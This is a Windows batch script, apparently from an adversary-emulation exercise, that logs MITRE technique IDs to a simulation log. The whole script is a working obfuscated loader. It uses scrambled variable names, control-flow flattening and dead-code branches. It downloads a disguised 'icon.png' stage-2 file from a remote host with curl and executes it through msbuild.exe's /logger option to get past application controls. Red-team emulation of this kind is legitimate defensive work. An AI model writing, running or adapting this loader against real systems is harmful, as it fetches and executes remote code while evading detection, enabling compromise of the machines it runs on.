@echo off
setlocal enabledelayedexpansion

:: Obfuscated SET variable preamble (random 5-8 char names)
SET xdfgh=%APPDATA%\10335\e559f148
SET jkloi=7ef9329c.txt
SET uytre=https://10.0.0.49/stage/2/icon.png?10335-7
SET mnbvc=ITZEL-S2BO
SET qwert=10335
SET asdfg=7
SET zxcvb=%APPDATA%\7
SET poiuy=%APPDATA%\7\macula-simulations.log
SET lkjhg=%APPDATA%\!asdfg!\macula-simulations.log
SET plokm=!DATE!/!TIME!

:: State variable for control flow flattening
SET aqwzs=0

:: Opaque predicate – always true
SET loit=123
SET qwxc=456

:loop_start
IF !aqwzs! EQU 0 GOTO :fghjk
IF !aqwzs! EQU 1 GOTO :rtuyi
IF !aqwzs! EQU 2 GOTO :vbnmo
IF !aqwzs! EQU 3 GOTO :cdefg
IF !aqwzs! EQU 4 GOTO :hijkl
IF !aqwzs! EQU 5 GOTO :mnopq
GOTO :end

:fghjk
:: State 0 – Heartbeat fetch (download Stage 2 Loader)
IF !loit! EQU !qwxc! (
    IF 1 EQU 1 (
        echo !plokm![DEBUG][!mnbvc!][!qwert!]: heartbeat_start>> "!lkjhg!" 2>nul
        curl -k -s -o "!xdfgh!\!jkloi!" "!uytre!"
        set ret=%ERRORLEVEL%
        echo !plokm![DEBUG][!mnbvc!][!qwert!]: heartbeat_complete=!ret!>> "!lkjhg!" 2>nul
        set aqwzs=1
    )
) ELSE (
    REM Dead code (never taken)
    echo !plokm![DEBUG][!mnbvc!][!qwert!]: dead_heartbeat>> "!lkjhg!" 2>nul
)
GOTO :loop_start

:rtuyi
:: State 1 – Change directory (log only, full paths used later)
IF 1 EQU 1 (
    echo !plokm![DEBUG][!mnbvc!][!qwert!]: chdir_start>> "!lkjhg!" 2>nul
    cd /d "!xdfgh!" >nul 2>&1
    set ret2=%ERRORLEVEL%
    echo !plokm![DEBUG][!mnbvc!][!qwert!]: chdir_result=!ret2!>> "!lkjhg!" 2>nul
    set aqwzs=2
)
GOTO :loop_start

:vbnmo
:: State 2 – Create minimal .proj file
IF %ERRORLEVEL% GEQ 0 (
    echo !plokm![DEBUG][!mnbvc!][!qwert!]: proj_create_start>> "!lkjhg!" 2>nul
    echo ^<Project/^> > "!xdfgh!\build.proj"
    set ret3=%ERRORLEVEL%
    echo !plokm![DEBUG][!mnbvc!][!qwert!]: proj_create_result=!ret3!>> "!lkjhg!" 2>nul
    set aqwzs=3
)
GOTO :loop_start

:cdefg
:: State 3 – Execute msbuild /logger: (LOLBIN invocation)
set mnbpo=false
IF not defined mnbpo (
    echo !plokm![DEBUG][!mnbvc!][!qwert!]: msbuild_start>> "!lkjhg!" 2>nul
    %SystemRoot%\Microsoft.NET\Framework64\v4.0.30319\msbuild.exe "!xdfgh!\build.proj" /logger:LoggerEntry,"!xdfgh!\!jkloi!";MyParameters,Foo >NUL 2>&1
    set ret4=%ERRORLEVEL%
    echo !plokm![DEBUG][!mnbvc!][!qwert!]: msbuild_result=!ret4!>> "!lkjhg!" 2>nul
    set aqwzs=4
) ELSE (
    REM Dead code
    set aqwzs=99
)
GOTO :loop_start

:hijkl
:: State 4 – TTP logging
set lpop=0
IF !lpop! LSS 1 (
    IF !ret4! EQU 0 (
        echo !plokm![TTP][!mnbvc!][!qwert!]: T1218^|System Binary Proxy Execution=[OK]:[]>> "!lkjhg!" 2>nul
    ) ELSE (
        echo !plokm![TTP][!mnbvc!][!qwert!]: T1218^|System Binary Proxy Execution=[FAIL]:[msbuild_exit_nonzero]>> "!lkjhg!" 2>nul
    )
    echo !plokm![TTP][!mnbvc!][!qwert!]: T1027^|Obfuscated Files or Information=[OK]:[]>> "!lkjhg!" 2>nul
    set aqwzs=5
) ELSE (
    REM Dead code
    echo !plokm![DEBUG][!mnbvc!][!qwert!]: dead_ttp>> "!lkjhg!" 2>nul
)
GOTO :loop_start

:mnopq
:: State 5 – End
echo !plokm![DEBUG][!mnbvc!][!qwert!]: script_end>> "!lkjhg!" 2>nul
GOTO :end

:end
endlocal